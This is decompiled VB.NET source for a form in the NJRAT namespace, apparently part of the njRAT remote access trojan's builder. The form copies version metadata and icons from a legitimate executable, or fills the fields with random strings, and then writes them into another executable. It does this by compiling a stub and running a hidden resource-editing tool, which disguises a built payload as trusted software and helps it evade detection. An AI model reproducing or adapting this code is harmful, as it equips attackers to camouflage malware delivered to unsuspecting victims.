Imports System
Imports System.CodeDom.Compiler
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.My.Resources

Namespace NJRAT
	' Token: 0x02000009 RID: 9
	<DesignerGenerated()>
	Public Partial Class Asemb
		Inherits Form

		' Token: 0x06000028 RID: 40 RVA: 0x0000288A File Offset: 0x00000A8A
		Public Sub New()
			Me.ico = New OpenFileDialog()
			Me.p = New OpenFileDialog()
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000019 RID: 25
		' (get) Token: 0x0600002B RID: 43 RVA: 0x00003A16 File Offset: 0x00001C16
		' (set) Token: 0x0600002C RID: 44 RVA: 0x00003A20 File Offset: 0x00001C20
		Friend Overridable Property TXTFilename As TextBox

		' Token: 0x1700001A RID: 26
		' (get) Token: 0x0600002D RID: 45 RVA: 0x00003A29 File Offset: 0x00001C29
		' (set) Token: 0x0600002E RID: 46 RVA: 0x00003A34 File Offset: 0x00001C34
		Friend Overridable Property Button1 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button1_Click
				Dim button As Button = Me._Button1
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button1 = value
				button = Me._Button1
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700001B RID: 27
		' (get) Token: 0x0600002F RID: 47 RVA: 0x00003A77 File Offset: 0x00001C77
		' (set) Token: 0x06000030 RID: 48 RVA: 0x00003A81 File Offset: 0x00001C81
		Friend Overridable Property T1 As TextBox

		' Token: 0x1700001C RID: 28
		' (get) Token: 0x06000031 RID: 49 RVA: 0x00003A8A File Offset: 0x00001C8A
		' (set) Token: 0x06000032 RID: 50 RVA: 0x00003A94 File Offset: 0x00001C94
		Friend Overridable Property T2 As TextBox

		' Token: 0x1700001D RID: 29
		' (get) Token: 0x06000033 RID: 51 RVA: 0x00003A9D File Offset: 0x00001C9D
		' (set) Token: 0x06000034 RID: 52 RVA: 0x00003AA7 File Offset: 0x00001CA7
		Friend Overridable Property T4 As TextBox

		' Token: 0x1700001E RID: 30
		' (get) Token: 0x06000035 RID: 53 RVA: 0x00003AB0 File Offset: 0x00001CB0
		' (set) Token: 0x06000036 RID: 54 RVA: 0x00003ABA File Offset: 0x00001CBA
		Friend Overridable Property T3 As TextBox

		' Token: 0x1700001F RID: 31
		' (get) Token: 0x06000037 RID: 55 RVA: 0x00003AC3 File Offset: 0x00001CC3
		' (set) Token: 0x06000038 RID: 56 RVA: 0x00003ACD File Offset: 0x00001CCD
		Friend Overridable Property T5 As TextBox

		' Token: 0x17000020 RID: 32
		' (get) Token: 0x06000039 RID: 57 RVA: 0x00003AD6 File Offset: 0x00001CD6
		' (set) Token: 0x0600003A RID: 58 RVA: 0x00003AE0 File Offset: 0x00001CE0
		Friend Overridable Property Label1 As Label

		' Token: 0x17000021 RID: 33
		' (get) Token: 0x0600003B RID: 59 RVA: 0x00003AE9 File Offset: 0x00001CE9
		' (set) Token: 0x0600003C RID: 60 RVA: 0x00003AF3 File Offset: 0x00001CF3
		Friend Overridable Property Label2 As Label

		' Token: 0x17000022 RID: 34
		' (get) Token: 0x0600003D RID: 61 RVA: 0x00003AFC File Offset: 0x00001CFC
		' (set) Token: 0x0600003E RID: 62 RVA: 0x00003B06 File Offset: 0x00001D06
		Friend Overridable Property Label3 As Label

		' Token: 0x17000023 RID: 35
		' (get) Token: 0x0600003F RID: 63 RVA: 0x00003B0F File Offset: 0x00001D0F
		' (set) Token: 0x06000040 RID: 64 RVA: 0x00003B19 File Offset: 0x00001D19
		Friend Overridable Property Label4 As Label

		' Token: 0x17000024 RID: 36
		' (get) Token: 0x06000041 RID: 65 RVA: 0x00003B22 File Offset: 0x00001D22
		' (set) Token: 0x06000042 RID: 66 RVA: 0x00003B2C File Offset: 0x00001D2C
		Friend Overridable Property Label6 As Label

		' Token: 0x17000025 RID: 37
		' (get) Token: 0x06000043 RID: 67 RVA: 0x00003B35 File Offset: 0x00001D35
		' (set) Token: 0x06000044 RID: 68 RVA: 0x00003B3F File Offset: 0x00001D3F
		Friend Overridable Property N1 As NumericUpDown

		' Token: 0x17000026 RID: 38
		' (get) Token: 0x06000045 RID: 69 RVA: 0x00003B48 File Offset: 0x00001D48
		' (set) Token: 0x06000046 RID: 70 RVA: 0x00003B52 File Offset: 0x00001D52
		Friend Overridable Property N2 As NumericUpDown

		' Token: 0x17000027 RID: 39
		' (get) Token: 0x06000047 RID: 71 RVA: 0x00003B5B File Offset: 0x00001D5B
		' (set) Token: 0x06000048 RID: 72 RVA: 0x00003B65 File Offset: 0x00001D65
		Friend Overridable Property N3 As NumericUpDown

		' Token: 0x17000028 RID: 40
		' (get) Token: 0x06000049 RID: 73 RVA: 0x00003B6E File Offset: 0x00001D6E
		' (set) Token: 0x0600004A RID: 74 RVA: 0x00003B78 File Offset: 0x00001D78
		Friend Overridable Property N4 As NumericUpDown

		' Token: 0x17000029 RID: 41
		' (get) Token: 0x0600004B RID: 75 RVA: 0x00003B81 File Offset: 0x00001D81
		' (set) Token: 0x0600004C RID: 76 RVA: 0x00003B8B File Offset: 0x00001D8B
		Friend Overridable Property N9 As NumericUpDown

		' Token: 0x1700002A RID: 42
		' (get) Token: 0x0600004D RID: 77 RVA: 0x00003B94 File Offset: 0x00001D94
		' (set) Token: 0x0600004E RID: 78 RVA: 0x00003B9E File Offset: 0x00001D9E
		Friend Overridable Property N8 As NumericUpDown

		' Token: 0x1700002B RID: 43
		' (get) Token: 0x0600004F RID: 79 RVA: 0x00003BA7 File Offset: 0x00001DA7
		' (set) Token: 0x06000050 RID: 80 RVA: 0x00003BB1 File Offset: 0x00001DB1
		Friend Overridable Property N7 As NumericUpDown

		' Token: 0x1700002C RID: 44
		' (get) Token: 0x06000051 RID: 81 RVA: 0x00003BBA File Offset: 0x00001DBA
		' (set) Token: 0x06000052 RID: 82 RVA: 0x00003BC4 File Offset: 0x00001DC4
		Friend Overridable Property N6 As NumericUpDown

		' Token: 0x1700002D RID: 45
		' (get) Token: 0x06000053 RID: 83 RVA: 0x00003BCD File Offset: 0x00001DCD
		' (set) Token: 0x06000054 RID: 84 RVA: 0x00003BD7 File Offset: 0x00001DD7
		Friend Overridable Property Label7 As Label

		' Token: 0x1700002E RID: 46
		' (get) Token: 0x06000055 RID: 85 RVA: 0x00003BE0 File Offset: 0x00001DE0
		' (set) Token: 0x06000056 RID: 86 RVA: 0x00003BEA File Offset: 0x00001DEA
		Friend Overridable Property Label8 As Label

		' Token: 0x1700002F RID: 47
		' (get) Token: 0x06000057 RID: 87 RVA: 0x00003BF3 File Offset: 0x00001DF3
		' (set) Token: 0x06000058 RID: 88 RVA: 0x00003C00 File Offset: 0x00001E00
		Friend Overridable Property Button2 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button2_Click
				Dim button As Button = Me._Button2
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button2 = value
				button = Me._Button2
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000030 RID: 48
		' (get) Token: 0x06000059 RID: 89 RVA: 0x00003C43 File Offset: 0x00001E43
		' (set) Token: 0x0600005A RID: 90 RVA: 0x00003C50 File Offset: 0x00001E50
		Friend Overridable Property Button3 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button3_Click
				Dim button As Button = Me._Button3
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button3 = value
				button = Me._Button3
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000031 RID: 49
		' (get) Token: 0x0600005B RID: 91 RVA: 0x00003C93 File Offset: 0x00001E93
		' (set) Token: 0x0600005C RID: 92 RVA: 0x00003CA0 File Offset: 0x00001EA0
		Friend Overridable Property Button4 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button4_Click
				Dim button As Button = Me._Button4
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button4 = value
				button = Me._Button4
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000032 RID: 50
		' (get) Token: 0x0600005D RID: 93 RVA: 0x00003CE3 File Offset: 0x00001EE3
		' (set) Token: 0x0600005E RID: 94 RVA: 0x00003CF0 File Offset: 0x00001EF0
		Friend Overridable Property Button6 As Button
			<CompilerGenerated()>
			Get
				Return Me._Button6
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Button)
				Dim value2 As EventHandler = AddressOf Me.Button6_Click
				Dim button As Button = Me._Button6
				If button IsNot Nothing Then
					RemoveHandler button.Click, value2
				End If
				Me._Button6 = value
				button = Me._Button6
				If button IsNot Nothing Then
					AddHandler button.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000033 RID: 51
		' (get) Token: 0x0600005F RID: 95 RVA: 0x00003D33 File Offset: 0x00001F33
		' (set) Token: 0x06000060 RID: 96 RVA: 0x00003D3D File Offset: 0x00001F3D
		Friend Overridable Property TextBox1 As TextBox

		' Token: 0x06000061 RID: 97 RVA: 0x00003D48 File Offset: 0x00001F48
		Public Function RandomN() As Object
			VBMath.Randomize()
			Dim num As Single = Conversion.Int(9F * VBMath.Rnd()) + 1F
			Return num
		End Function

		' Token: 0x06000062 RID: 98 RVA: 0x00003D80 File Offset: 0x00001F80
		Public Function GENRandom(longitud As Integer, NNNNN As Integer) As String
			Dim text As String = "012345678WERTYUIQWERTYUIWPL123456789KJHGFDSAZXC123456789VBNMQWERTY9QWERTYUIQWERTYUIOPLKJHGF123456789DSAZXCVBNMQWERTYUIOPLKJH123456789GFDSAZXCVBNMQWERTYUI123456789OPLKJHGFDSAYUIOPLKJHGFDSAZX123456789123456789123456789CVBNMOPLKJHGFDSAZXCVBNM"
			Dim random As Random = New Random()
			Dim stringBuilder As StringBuilder = New StringBuilder()
			For i As Integer = 1 To longitud
				Dim startIndex As Integer = random.[Next](0, NNNNN)
				stringBuilder.Append(text.Substring(startIndex, 1))
			Next
			Return stringBuilder.ToString()
		End Function

		' Token: 0x06000063 RID: 99 RVA: 0x00003DDC File Offset: 0x00001FDC
		Private Sub Display_Description(Name As String)
			Dim flag As Boolean = Operators.CompareString(Me.TXTFilename.Text, Nothing, False) = 0 Or Not File.Exists(Me.TXTFilename.Text)
			If flag Then
				Interaction.MsgBox("Select a file", MsgBoxStyle.Information, Nothing)
				MyBase.Close()
			Else
				Try
					Application.DoEvents()
					Dim flag2 As Boolean = File.Exists(Application.StartupPath + "\res.exe")
					If flag2 Then
						File.Delete(Application.StartupPath + "\res.exe")
					End If
					Thread.Sleep(100)
					File.WriteAllBytes(Application.StartupPath + "\res.exe", Resources.Res)
					Dim text As String = Resources.RHDiscription
					Dim vbcodeProvider As VBCodeProvider = New VBCodeProvider(New Dictionary(Of String, String)() From { { "CompilerVersion", "v2.0" } })
					Dim compilerParameters As CompilerParameters = New CompilerParameters()
					Dim compilerParameters2 As CompilerParameters = compilerParameters
					compilerParameters2.GenerateExecutable = True
					compilerParameters2.OutputAssembly = Application.StartupPath + "\" + Me.T1.Text + ".exe"
					compilerParameters2.CompilerOptions = "/target:winexe"
					compilerParameters2.ReferencedAssemblies.Add("System.dll")
					compilerParameters2.ReferencedAssemblies.Add("System.Windows.Forms.dll")
					compilerParameters2.MainClass = "X"
					Thread.Sleep(100)
					text = text.Replace("*Title*", Me.T2.Text)
					text = text.Replace("*Company*", Me.T3.Text)
					text = text.Replace("*Product*", Me.T4.Text)
					text = text.Replace("*Copyright*", Me.T5.Text)
					text = text.Replace("*Trademark*", Me.T1.Text)
					text = text.Replace("*version*", String.Concat(New String() { Me.N1.Value.ToString(), ".", Me.N2.Value.ToString(), ".", Me.N3.Value.ToString(), ".", Me.N4.Value.ToString() }))
					text = text.Replace("*fversion*", String.Concat(New String() { Me.N6.Value.ToString(), ".", Me.N7.Value.ToString(), ".", Me.N8.Value.ToString(), ".", Me.N9.Value.ToString() }))
					Dim compilerResults As CompilerResults = vbcodeProvider.CompileAssemblyFromSource(compilerParameters, New String() { text })
					Thread.Sleep(100)
					Dim text2 As String = Application.StartupPath + "\" + Me.T1.Text + ".exe"
					Dim text3 As String = Application.StartupPath + "\" + Me.T1.Text + ".res"
					Thread.Sleep(100)
					Interaction.Shell(String.Concat(New String() { "res.exe -extract ", text2, ",", text3, ",VERSIONINFO,," }), AppWinStyle.Hide, True, -1)
					Interaction.Shell(String.Concat(New String() { "res.exe -delete ", Name, ",", AppDomain.CurrentDomain.BaseDirectory, "res.exe,VERSIONINFO,," }), AppWinStyle.Hide, True, -1)
					Interaction.Shell(String.Concat(New String() { "res.exe -addoverwrite ", Name, ",", Name, ",", text3, ",VERSIONINFO,1," }), AppWinStyle.Hide, True, -1)
					Thread.Sleep(100)
					Dim flag3 As Boolean = File.Exists(Application.StartupPath + "\" + Me.T1.Text + ".exe")
					If flag3 Then
						File.Delete(Application.StartupPath + "\" + Me.T1.Text + ".exe")
					End If
					Dim flag4 As Boolean = File.Exists(Application.StartupPath + "\" + Me.T1.Text + ".res")
					If flag4 Then
						File.Delete(Application.StartupPath + "\" + Me.T1.Text + ".res")
					End If
					Dim flag5 As Boolean = File.Exists(Application.StartupPath + "\res.exe")
					If flag5 Then
						File.Delete(Application.StartupPath + "\res.exe")
					End If
					Dim flag6 As Boolean = File.Exists(Application.StartupPath + "\res.log")
					If flag6 Then
						File.Delete(Application.StartupPath + "\res.log")
					End If
					Dim flag7 As Boolean = File.Exists(Application.StartupPath + "\res.ini")
					If flag7 Then
						File.Delete(Application.StartupPath + "\res.ini")
						Thread.Sleep(100)
					End If
					IconInjector.InjectIcon(Me.p.FileName, Me.ico.FileName)
				Catch ex As Exception
				End Try
			End If
			MyBase.Close()
		End Sub

		' Token: 0x06000064 RID: 100 RVA: 0x00004378 File Offset: 0x00002578
		Private Sub Button2_Click(sender As Object, e As EventArgs)
			Me.T1.Text = Me.GENRandom(12, 55)
			Me.T2.Text = Me.GENRandom(5, 44)
			Me.T3.Text = Me.GENRandom(12, 50)
			Me.T4.Text = Me.GENRandom(12, 88)
			Me.T5.Text = Me.GENRandom(12, 93)
			Me.N1.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N2.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N3.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N4.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N6.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N7.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N8.Value = Conversions.ToDecimal(Me.RandomN())
			Me.N9.Value = Conversions.ToDecimal(Me.RandomN())
		End Sub

		' Token: 0x06000065 RID: 101 RVA: 0x000044AC File Offset: 0x000026AC
		Private Sub Button3_Click(sender As Object, e As EventArgs)
			Try
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "(.exe) |*.exe" }
				openFileDialog.ShowDialog()
				Dim flag As Boolean = openFileDialog.FileName.Length > 0
				If flag Then
					Dim versionInfo As FileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName)
					Me.T1.Text = Path.GetFileNameWithoutExtension(openFileDialog.FileName)
					Me.T2.Text = versionInfo.FileDescription
					Me.T3.Text = versionInfo.CompanyName
					Me.T4.Text = versionInfo.ProductName
					Me.T5.Text = versionInfo.LegalCopyright
					Dim array As String() = versionInfo.ProductVersion.Split(New Char() { "."c })
					Me.N1.Value = Conversions.ToDecimal(array(0))
					Me.N2.Value = Conversions.ToDecimal(array(1))
					Me.N3.Value = Conversions.ToDecimal(array(2))
					Me.N4.Value = Conversions.ToDecimal(array(3))
					Dim array2 As String() = versionInfo.FileVersion.Split(New Char() { "."c })
					Me.N6.Value = Conversions.ToDecimal(array2(0))
					Me.N7.Value = Conversions.ToDecimal(array2(1))
					Me.N8.Value = Conversions.ToDecimal(array2(2))
					Me.N9.Value = Conversions.ToDecimal(array2(3))
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x06000066 RID: 102 RVA: 0x00004658 File Offset: 0x00002858
		Private Sub Button4_Click(sender As Object, e As EventArgs)
			Me.Display_Description(Me.TXTFilename.Text)
		End Sub

		' Token: 0x06000067 RID: 103 RVA: 0x00004670 File Offset: 0x00002870
		Private Sub Button1_Click(sender As Object, e As EventArgs)
			Me.p.Filter = "Executable|*.exe"
			Me.p.Title = "Open"
			Dim flag As Boolean = Me.p.ShowDialog() = DialogResult.OK
			If flag Then
				Me.TXTFilename.Text = Me.p.FileName
			End If
		End Sub

		' Token: 0x06000068 RID: 104 RVA: 0x000046CC File Offset: 0x000028CC
		Private Sub Button6_Click(sender As Object, e As EventArgs)
			Me.ico.Filter = "Ico|*.ico"
			Me.ico.Title = "Ico"
			Me.ico.ShowDialog()
			Me.TextBox1.Text = Me.ico.FileName
		End Sub

		' Token: 0x0400002A RID: 42
		Private ico As OpenFileDialog

		' Token: 0x0400002B RID: 43
		Private p As OpenFileDialog
	End Class
End Namespace
